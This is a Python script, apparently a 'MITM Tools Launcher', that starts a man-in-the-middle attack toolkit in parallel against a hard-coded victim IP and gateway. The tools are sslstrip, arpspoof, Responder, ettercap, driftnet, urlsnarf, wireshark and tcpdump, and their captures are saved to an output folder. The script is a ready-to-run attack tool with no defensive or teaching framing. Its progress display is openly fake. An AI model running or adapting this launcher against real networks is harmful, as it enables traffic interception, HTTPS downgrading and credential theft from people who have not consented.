import asyncio
import os
import time
from rich.progress import Progress
from rich.console import Console

console = Console()


async def run_tool(tool_name, command, *args, task):
    console.print(f'\n[INFO] Starting {tool_name}...')
    process = await asyncio.create_subprocess_exec(
        command, *args,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )

    stdout, stderr = await process.communicate()
    task['finished'] = True
    output_file = os.path.join('mitm_output', f'{tool_name}.txt')
    with open(output_file, 'wb') as file:
        file.write(stdout + b'\n' + stderr)


async def main():
    console.print('\n🛠 [INFO] MITM Tools Launcher 🛠\n')

    # Predefined values for interface, victim IP, and gateway IP
    interface = 'eth0'
    victim_ip = '192.168.1.100'
    gateway_ip = '192.168.1.1'

    tasks = [
        {'emoji': '🔒', 'name': 'SSL Strip', 'finished': False, 'completed': 0,
         'command': ('sslstrip', '-i', interface, '-a', '-w', os.path.join('mitm_output', 'sslstrip.pcap'))},
        {'emoji': '🎣', 'name': 'ARP Spoof', 'finished': False, 'completed': 0,
         'command': ('arpspoof', '-i', interface, '-t', victim_ip, gateway_ip)},
        {'emoji': '🔑', 'name': 'Responder', 'finished': False, 'completed': 0,
         'command': ('responder', '-I', interface)},
        {'emoji': '👁', 'name': 'Ettercap', 'finished': False, 'completed': 0,
         'command': ('ettercap', '-T', '-q', '-i', interface)},
        {'emoji': '🌐', 'name': 'Driftnet', 'finished': False, 'completed': 0, 'command': ('driftnet', '-i', interface)},
        {'emoji': '🔗', 'name': 'Urlsnarf', 'finished': False, 'completed': 0, 'command': ('urlsnarf', '-i', interface)},
        {'emoji': '🕵️', 'name': 'Wireshark', 'finished': False, 'completed': 0,
         'command': ('wireshark', '-k', '-i', interface, '-w', os.path.join('mitm_output', 'wireshark.pcap'))},
        {'emoji': '📦', 'name': 'Tcpdump', 'finished': False, 'completed': 0,
         'command': ('tcpdump', '-i', interface, '-w', os.path.join('mitm_output', 'tcpdump.pcap'))},
    ]

    # Create mitm_output folder if it doesn't exist
    output_directory = 'mitm_output'
    if not os.path.exists(output_directory):
        os.makedirs(output_directory)

    with Progress() as progress:
        task_ids = [progress.add_task(f"{task['emoji']} [cyan]{task['name']}", total=100) for task in tasks]

        for i, task in enumerate(tasks):
            asyncio.create_task(run_tool(task['name'], *task['command'], task=task))

        start_time = time.time()
        while not all(task['finished'] for task in tasks):
            for i, task in enumerate(tasks):
                if not task['finished']:
                    elapsed_time = time.time() - start_time
                    fake_progress = min(100, int(elapsed_time * 20))
                    progress.update(task_ids[i], completed=fake_progress)

            await asyncio.sleep(0.1)


if __name__ == '__main__':
    asyncio.run(main())
